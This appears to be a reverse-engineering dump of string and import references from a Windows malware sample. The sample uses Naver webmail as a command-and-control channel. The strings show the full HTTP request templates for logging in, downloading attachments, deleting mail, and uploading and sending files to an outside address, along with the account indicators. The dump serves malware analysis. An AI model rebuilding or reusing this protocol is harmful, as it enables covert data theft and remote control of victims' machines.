reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x402e13	0x4140cc	import	0x402dd7	KERNEL32.dll.Sleep
0x402e1e	0x4177d4	string	0x402dd7	PreCommProc : Start!
0x402e31	0x4177ec	string	0x402dd7	PreCommProc : g_wDownControlOption(%d)
0x402e4a	0x414074	import	0x402dd7	KERNEL32.dll.CreateEventA
0x402e50	0x41403c	import	0x402dd7	KERNEL32.dll.FindFirstFileA
0x402e6c	0x417814	string	0x402dd7	PreCommProc : Install Service Ok!
0x402e8c	0x417838	string	0x402dd7	PreCommProc : Install Service Failed!
0x402ea9	0x417860	string	0x402dd7	PreCommProc : DownloadProc failed
0x402ebd	0x417884	string	0x402dd7	PreCommProc : UploadProc failed
0x402ed3	0x414048	import	0x402dd7	KERNEL32.dll.WaitForSingleObject
0x402eda	0x41407c	import	0x402dd7	KERNEL32.dll.ReleaseMutex
0x402ee1	0x414018	import	0x402dd7	KERNEL32.dll.CloseHandle
0x402ee8	0x414080	import	0x402dd7	KERNEL32.dll.ExitProcess
0x4037b0	0x4037ba	string	0x403778	<a|\b<f
0x4037b4	0x4037ba	string	0x403778	<a|\b<f
0x4037d9	0x4037e3	string	0x403778	<a|\b<f
0x4037dd	0x4037e3	string	0x403778	<a|\b<f
0x403874	0x414084	import	0x403829	KERNEL32.dll.GetTickCount
0x403a8f	0x4178a4	string	0x403a59	Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
0x403aa0	0x4178dc	string	0x403a59	Host: static.nid.naver.com
0x403ab0	0x4178f8	string	0x403a59	Upgrade-Insecure-Requests: 1
0x403ac1	0x417918	string	0x403a59	Connection: keep-alive
0x403ad1	0x417930	string	0x403a59	Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
0x403ae4	0x4179a4	string	0x403a59	static.nid.naver.com
0x403af2	0x4179bc	string	0x403a59	/enclogin/nid_t.nvr
0x403afa	0x417a28	string	0x403a59	wininet.dll
0x403b01	0x4179d0	string	0x403a59	text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
0x403b15	0x4140dc	import	0x403a59	KERNEL32.dll.LoadLibraryA
0x403b24	0x417a34	string	0x403a59	InternetOpenA
0x403b2a	0x4140d4	import	0x403a59	KERNEL32.dll.GetProcAddress
0x403b55	0x4141dc	import	0x403a59	WININET.dll.InternetConnectA
0x403b65	0x417a44	string	0x403a59	Login_RecvNId_T : InternetConnect failed
0x403e10	0x4178a4	string	0x403dd9	Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
0x403e23	0x417b5c	string	0x403dd9	Host: nid.naver.com
0x403e2e	0x417b80	string	0x403dd9	Referer: https://nid.naver.com/nidlogin.login?url=http%3A%2F%2Fmail.naver.com%2F
0x403e3f	0x417930	string	0x403dd9	Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
0x403e4f	0x417b70	string	0x403dd9	nid.naver.com
0x403e69	0x417bd4	string	0x403dd9	/login/ext/keys_js2.nhn
0x403ea1	0x4141dc	import	0x403dd9	WININET.dll.InternetConnectA
0x403eb1	0x414034	import	0x403dd9	KERNEL32.dll.GetLastError
0x403eb8	0x417bf0	string	0x403dd9	Login_RecvGetKeys : InternetConnect failed. %d
0x40448b	0x4178a4	string	0x404449	Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
0x40449c	0x417b80	string	0x404449	Referer: https://nid.naver.com/nidlogin.login?url=http%3A%2F%2Fmail.naver.com%2F
0x4044b6	0x417d74	string	0x404449	Content-Type: application/x-www-form-urlencoded
0x4044c6	0x417b5c	string	0x404449	Host: nid.naver.com
0x4044d1	0x417da4	string	0x404449	Origin: https://nid.naver.com
0x4044e9	0x417dc4	string	0x404449	Cache-Control: max-age=0
0x404513	0x417de0	string	0x404449	Login_PostPWDpage : GetEncPWD failed
0x404524	0x417e08	string	0x404449	enctp=2&encpw=
0x404588	0x417e18	string	0x404449	&encnm=
0x4045d0	0x417e20	string	0x404449	&svctype=0&svc=&viewtype=0&locale=ko_KR&postDataKey=&smart_LEVEL=1&logintp=&url=http%3A%2F%2Fmail.naver.com%2F&localechange=&theme_mode=&ls=&xid=&pre_id=&resp=&exp=&ru=&id=&pw=
0x4045ed	0x417ed8	string	0x404449	Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)
0x4045fd	0x417b70	string	0x404449	nid.naver.com
0x40460a	0x417f78	string	0x404449	/nidlogin.login
0x404627	0x4179d0	string	0x404449	text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
0x404653	0x4141dc	import	0x404449	WININET.dll.InternetConnectA
0x404663	0x414034	import	0x404449	KERNEL32.dll.GetLastError
0x40466a	0x417f88	string	0x404449	Login_PostPWDpage : InternetConnect failed. %d
0x404688	0x417a70	string	0x404449	HTTP/1.1
0x404691	0x417fb8	string	0x404449	POST
0x40469c	0x4141e0	import	0x404449	WININET.dll.HttpOpenRequestA
0x4046ac	0x414034	import	0x404449	KERNEL32.dll.GetLastError
0x4046b3	0x417fc0	string	0x404449	Login_PostPWDpage : HttpOpenRequest failed. %d
0x4046e1	0x417ff0	string	0x404449	%s\r\n%s\r\n%s\r\n%s\r\n%s\r\n%s
0x4046ec	0x418008	string	0x404449	POST
0x40474b	0x417ac4	string	0x404449	HTTP/1.1
0x404754	0x417ad0	string	0x404449	User-Agent:
0x4047a8	0x417ae0	string	0x404449	Accept:
0x404815	0x4141f4	import	0x404449	WININET.dll.HttpSendRequestA
0x40481d	0x404835	string	0x404449	jd^V
0x40481f	0x417aec	string	0x404449	////////////// Response Headers getting failure //////////
0x404829	0x418010	string	0x404449	Login_PostPWDpage : HttpSendRequest failed
0x404862	0x4141e4	import	0x404449	WININET.dll.HttpQueryInfoA
0x404870	0x414034	import	0x404449	KERNEL32.dll.GetLastError
0x4048dd	0x4141e8	import	0x404449	WININET.dll.InternetQueryDataAvailable
0x404923	0x4141ec	import	0x404449	WININET.dll.InternetReadFile
0x4049af	0x4048d0	string	0x404449	SSh\
0x4049bb	0x4141f0	import	0x404449	WININET.dll.InternetCloseHandle
0x4049de	0x41803c	string	0x404449	"mailSN":
0x404a23	0x418048	string	0x404449	"subject":"f_%s"
0x404a2a	0x414034	import	0x404449	KERNEL32.dll.GetLastError
0x404a31	0x417c80	string	0x404449	Login_RecvGetKeys : InternetQueryDataAvailable error. %d
0x404a3b	0x414034	import	0x404449	KERNEL32.dll.GetLastError
0x404a42	0x417cbc	string	0x404449	Login_RecvGetKeys : InternetReadFile failed. %d
0x404a4c	0x41805c	string	0x404449	"subject":"s_%s"
0x404a5a	0x41bf00	string	0x404449	123456789
0x404a65	0x418070	string	0x404449	"subject":"%s"
0x404c29	0x418080	string	0x404449	MailSN value For <%s>: mailSN = %s, id = %s
0x404c3f	0x4180ac	string	0x404449	MailSN not found. <%s>
0x404ca7	0x4178a4	string	0x404c74	Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
0x404cb8	0x4180c4	string	0x404c74	Host: mail.naver.com
0x404cc6	0x4180dc	string	0x404c74	Referer: https://mail.naver.com/?n=1519882513612&v=f
0x404cd7	0x418118	string	0x404c74	Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
0x404ce7	0x41818c	string	0x404c74	mail.naver.com
0x404cf8	0x41819c	string	0x404c74	/file/download/each/?attachType=normal&mailSN=
0x404d6e	0x4181cc	string	0x404c74	&attachIndex=2&virus=1&domain=mail.naver.com&u=
0x404d73	0x41c008	string	0x404c74	poewt25
0x404daf	0x4179d0	string	0x404c74	text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
0x404ddc	0x4141dc	import	0x404c74	WININET.dll.InternetConnectA
0x404dec	0x4181fc	string	0x404c74	MailDownLoading : InternetConnect failed
0x404e0b	0x417a70	string	0x404c74	HTTP/1.1
0x404e1d	0x4141e0	import	0x404c74	WININET.dll.HttpOpenRequestA
0x404e2d	0x418228	string	0x404c74	MailDownLoading : HttpOpenRequest failed
0x404e4c	0x417570	string	0x404c74	%s\r\n%s\r\n%s
0x404e57	0x417abc	string	0x404c74	GET
0x404eb8	0x417ac4	string	0x404c74	HTTP/1.1
0x404ec1	0x417ad0	string	0x404c74	User-Agent:
0x404f15	0x417ae0	string	0x404c74	Accept:
0x404f77	0x4141f4	import	0x404c74	WININET.dll.HttpSendRequestA
0x404f7f	0x404f97	string	0x404c74	jd^V
0x404f81	0x417aec	string	0x404c74	////////////// Response Headers getting failure //////////
0x404f8b	0x418254	string	0x404c74	MailDownLoading : HttpSendRequest failed
0x404fc4	0x4141e4	import	0x404c74	WININET.dll.HttpQueryInfoA
0x404fd2	0x414034	import	0x404c74	KERNEL32.dll.GetLastError
0x405033	0x4141e8	import	0x404c74	WININET.dll.InternetQueryDataAvailable
0x405079	0x4141ec	import	0x404c74	WININET.dll.InternetReadFile
0x405107	0x405026	string	0x404c74	SSh\
0x40510c	0x414034	import	0x404c74	KERNEL32.dll.GetLastError
0x405113	0x417c80	string	0x404c74	Login_RecvGetKeys : InternetQueryDataAvailable error. %d
0x405123	0x414034	import	0x404c74	KERNEL32.dll.GetLastError
0x40512a	0x417cbc	string	0x404c74	Login_RecvGetKeys : InternetReadFile failed. %d
0x405137	0x414040	import	0x404c74	KERNEL32.dll.DeleteFileA
0x40513d	0x418280	string	0x404c74	Saving download result...
0x40518f	0x41829c	string	0x404c74	Mail Download OK!!!
0x4051a2	0x4141f0	import	0x404c74	WININET.dll.InternetCloseHandle
0x40520b	0x4178a4	string	0x4051d8	Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
0x40521c	0x4180c4	string	0x4051d8	Host: mail.naver.com
0x40522a	0x4180dc	string	0x4051d8	Referer: https://mail.naver.com/?n=1519882513612&v=f
0x405238	0x4182b0	string	0x4051d8	charset: utf-8
0x405249	0x4182c0	string	0x4051d8	Origin: https://mail.naver.com
0x405259	0x4182e0	string	0x4051d8	X-Requested-With: XMLHttpRequest
0x40526a	0x418304	string	0x4051d8	Content-Type: application/x-www-form-urlencoded; charset=UTF-8
0x40527d	0x418118	string	0x4051d8	Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
0x40528d	0x41818c	string	0x4051d8	mail.naver.com
0x40529e	0x418344	string	0x4051d8	/json/select/delete/
0x4052a9	0x41835c	string	0x4051d8	mailSNList=
0x405326	0x418368	string	0x4051d8	&deleteSpamDirect=-1&currentFolderType=etc&folderSNList=0&u=
0x405336	0x41c008	string	0x4051d8	poewt25
0x4053a5	0x4141dc	import	0x4051d8	WININET.dll.InternetConnectA
0x4053b5	0x4183a8	string	0x4051d8	Deleting : InternetConnect failed
0x4053d5	0x417a70	string	0x4051d8	HTTP/1.1
0x4053de	0x417fb8	string	0x4051d8	POST
0x4053e4	0x4141e0	import	0x4051d8	WININET.dll.HttpOpenRequestA
0x4053f4	0x4183cc	string	0x4051d8	Deleting : HttpOpenRequest failed
0x405429	0x4183f0	string	0x4051d8	%s\r\n%s\r\n%s\r\n%s\r\n%s\r\n%s\r\n%s
0x405434	0x418008	string	0x4051d8	POST
0x405493	0x417ac4	string	0x4051d8	HTTP/1.1
0x40549c	0x417ad0	string	0x4051d8	User-Agent:
0x4054f0	0x417ae0	string	0x4051d8	Accept:
0x40555d	0x4141f4	import	0x4051d8	WININET.dll.HttpSendRequestA
0x405565	0x40557d	string	0x4051d8	jd^V
0x405567	0x417aec	string	0x4051d8	////////////// Response Headers getting failure //////////
0x405571	0x41840c	string	0x4051d8	Deleting : HttpSendRequest failed
0x4055aa	0x4141e4	import	0x4051d8	WININET.dll.HttpQueryInfoA
0x4055b8	0x414034	import	0x4051d8	KERNEL32.dll.GetLastError
0x405607	0x4141f0	import	0x4051d8	WININET.dll.InternetCloseHandle
0x40566b	0x4178a4	string	0x405638	Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
0x40567c	0x4180dc	string	0x405638	Referer: https://mail.naver.com/?n=1519882513612&v=f
0x40568d	0x418304	string	0x405638	Content-Type: application/x-www-form-urlencoded; charset=UTF-8
0x4056a0	0x4180c4	string	0x405638	Host: mail.naver.com
0x4056ae	0x418430	string	0x405638	orderType=new&lists=&charset=&u=
0x4056e1	0x41c008	string	0x405638	poewt25
0x405725	0x418118	string	0x405638	Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
0x405735	0x41818c	string	0x405638	mail.naver.com
0x405743	0x418454	string	0x405638	/json/write/
0x40578c	0x4141dc	import	0x405638	WININET.dll.InternetConnectA
0x40579c	0x418464	string	0x405638	PreUploading : InternetConnect failed
0x4057bb	0x417a70	string	0x405638	HTTP/1.1
0x4057c4	0x417fb8	string	0x405638	POST
0x4057ca	0x4141e0	import	0x405638	WININET.dll.HttpOpenRequestA
0x4057da	0x41848c	string	0x405638	PreUploading : HttpOpenRequest failed
0x405800	0x417aac	string	0x405638	%s\r\n%s\r\n%s\r\n%s
0x40580b	0x418008	string	0x405638	POST
0x40586a	0x417ac4	string	0x405638	HTTP/1.1
0x405873	0x417ad0	string	0x405638	User-Agent:
0x4058c7	0x417ae0	string	0x405638	Accept:
0x405934	0x4141f4	import	0x405638	WININET.dll.HttpSendRequestA
0x40593c	0x405954	string	0x405638	jd^V
0x40593e	0x417aec	string	0x405638	////////////// Response Headers getting failure //////////
0x405948	0x4184b4	string	0x405638	PreUploading : HttpSendRequest failed
0x405981	0x4141e4	import	0x405638	WININET.dll.HttpQueryInfoA
0x40598f	0x414034	import	0x405638	KERNEL32.dll.GetLastError
0x4059f0	0x4141e8	import	0x405638	WININET.dll.InternetQueryDataAvailable
0x405a36	0x4141ec	import	0x405638	WININET.dll.InternetReadFile
0x405aca	0x4059e3	string	0x405638	SSh\
0x405acf	0x414034	import	0x405638	KERNEL32.dll.GetLastError
0x405ad6	0x417c80	string	0x405638	Login_RecvGetKeys : InternetQueryDataAvailable error. %d
0x405ae6	0x414034	import	0x405638	KERNEL32.dll.GetLastError
0x405aed	0x417cbc	string	0x405638	Login_RecvGetKeys : InternetReadFile failed. %d
0x405afa	0x4141f0	import	0x405638	WININET.dll.InternetCloseHandle
0x405b12	0x4184dc	string	0x405638	"attachId":"
0x405b7a	0x4184ec	string	0x405638	PreUploading : lpAttachID = %s
0x405bd3	0x4178a4	string	0x405ba0	Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
0x405be4	0x4180dc	string	0x405ba0	Referer: https://mail.naver.com/?n=1519882513612&v=f
0x405bf2	0x41850c	string	0x405ba0	Content-Type:
0x405c4a	0x4180c4	string	0x405ba0	Host: mail.naver.com
0x405c58	0x4182c0	string	0x405ba0	Origin: https://mail.naver.com
0x405c68	0x41851c	string	0x405ba0	indexNum: 1
0x405c8b	0x41bf00	string	0x405ba0	123456789
0x405c90	0x418528	string	0x405ba0	fileName: %s.dat
0x405ca5	0x41853c	string	0x405ba0	attachID:
0x405cf7	0x418548	string	0x405ba0	type:
0x405d48	0x418550	string	0x405ba0	fileSize:
0x405d8b	0x41855c	string	0x405ba0	getting the attachFile handle error in uploading step-1
0x405da5	0x408d34	string	0x405ba0	j\fhp
0x405df0	0x418598	string	0x405ba0	file buffer malloc error in uploading step-1
0x405e9e	0x418118	string	0x405ba0	Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
0x405eae	0x41818c	string	0x405ba0	mail.naver.com
0x405ebf	0x4185cc	string	0x405ba0	/json/write/file/uploadByXHR
0x405f01	0x4141dc	import	0x405ba0	WININET.dll.InternetConnectA
0x405f11	0x4185ec	string	0x405ba0	uploading step-1 : InternetConnect failed
0x405f29	0x417a70	string	0x405ba0	HTTP/1.1
0x405f32	0x417fb8	string	0x405ba0	POST
0x405f38	0x4141e0	import	0x405ba0	WININET.dll.HttpOpenRequestA
0x405f48	0x418618	string	0x405ba0	uploading step-1 : HttpOpenRequest failed.
0x405f98	0x418648	string	0x405ba0	%s\r\n%s\r\n%s\r\n%s\r\n%s\r\n%s\r\n%s\r\n%s\r\n%s\r\n%s
0x405fa3	0x418008	string	0x405ba0	POST
0x406002	0x417ac4	string	0x405ba0	HTTP/1.1
0x40600b	0x417ad0	string	0x405ba0	User-Agent:
0x40605f	0x417ae0	string	0x405ba0	Accept:
0x4060cb	0x4141f4	import	0x405ba0	WININET.dll.HttpSendRequestA
0x4060d3	0x4060fa	string	0x405ba0	jd^V
0x4060d5	0x414034	import	0x405ba0	KERNEL32.dll.GetLastError
0x4060dc	0x418670	string	0x405ba0	uploading step-1 : HttpSendRequest failed. Err[%d]
0x4060e6	0x417aec	string	0x405ba0	////////////// Response Headers getting failure //////////
0x406127	0x4141e4	import	0x405ba0	WININET.dll.HttpQueryInfoA
0x406135	0x414034	import	0x405ba0	KERNEL32.dll.GetLastError
0x4061ae	0x4141e8	import	0x405ba0	WININET.dll.InternetQueryDataAvailable
0x4061f4	0x4141ec	import	0x405ba0	WININET.dll.InternetReadFile
0x406282	0x4061a1	string	0x405ba0	SSh\
0x406287	0x414034	import	0x405ba0	KERNEL32.dll.GetLastError
0x40628e	0x417c80	string	0x405ba0	Login_RecvGetKeys : InternetQueryDataAvailable error. %d
0x40629d	0x414034	import	0x405ba0	KERNEL32.dll.GetLastError
0x4062a4	0x417cbc	string	0x405ba0	Login_RecvGetKeys : InternetReadFile failed. %d
0x4062b1	0x4141f0	import	0x405ba0	WININET.dll.InternetCloseHandle
0x40632e	0x4186ac	string	0x405ba0	Uploading : aSize = %s
0x40638b	0x4178a4	string	0x406354	Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
0x40639c	0x4180dc	string	0x406354	Referer: https://mail.naver.com/?n=1519882513612&v=f
0x4063ad	0x418304	string	0x406354	Content-Type: application/x-www-form-urlencoded; charset=UTF-8
0x4063c0	0x4180c4	string	0x406354	Host: mail.naver.com
0x4063cb	0x4182b0	string	0x406354	charset: utf-8
0x4063dc	0x4182c0	string	0x406354	Origin: https://mail.naver.com
0x4063ec	0x4182e0	string	0x406354	X-Requested-With: XMLHttpRequest
0x4063fa	0x4186c4	string	0x406354	senderName=hot&to=chioekang59%40daum.net%3B&cc=&bcc=&subject=
0x40641b	0x41bf00	string	0x406354	123456789
0x40645f	0x418708	string	0x406354	&body=%3Chtml%3E%3Chead%3E%3Cstyle%3Ep%7Bmargin-top%3A0px%3Bmargin-bottom%3A0px%3B%7D%3C%2Fstyle%3E%3C%2Fhead%3E%3Cbody%3E%3Cdiv%20style%3D%22font-size%3A10pt%3B%20font-family%3AGulim%2C%20sans-serif%3B%22%3E%3Cp%3E
0x4064a4	0x4187e0	string	0x406354	%3C%2Fp%3E%3C%2Fdiv%3E%3C%2Fbody%3E%3C%2Fhtml%3E&contentType=html&sendSeparately=false&saveSentBox=true&type=new&fromMe=0&attachID=
0x4064e9	0x418868	string	0x406354	&reserveDate=&reserveGMT=&reserveTime=&calendarVal=&autoSaveMailSN=&attachCount=1&attachSize=
0x406537	0x4188c8	string	0x406354	&bigfile=0&sessionID=&seqNums=&priority=0&ndriveFileInfos=&threadId=&savedType=new&savedLists=&marked=false&lists=&serviceID=&bigfileCount=0&uploaderType=html5&bigfileNotice=false&bigfileHost=bigfile.mail.naver.com&replaceImageUrl=&u=
0x406549	0x41c008	string	0x406354	poewt25
0x40658b	0x418118	string	0x406354	Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
0x40659b	0x41818c	string	0x406354	mail.naver.com
0x4065ac	0x4189b4	string	0x406354	/json/write/send/?aId=
0x406613	0x4189cc	string	0x406354	&aCount=1&aSize=
0x406683	0x4141dc	import	0x406354	WININET.dll.InternetConnectA
0x406693	0x4189e0	string	0x406354	UploadSending : InternetConnect failed
0x4066b3	0x417a70	string	0x406354	HTTP/1.1
0x4066bf	0x417fb8	string	0x406354	POST
0x4066ca	0x4141e0	import	0x406354	WININET.dll.HttpOpenRequestA
0x4066da	0x418a08	string	0x406354	UploadSending : HttpOpenRequest failed
0x40670c	0x4183f0	string	0x406354	%s\r\n%s\r\n%s\r\n%s\r\n%s\r\n%s\r\n%s
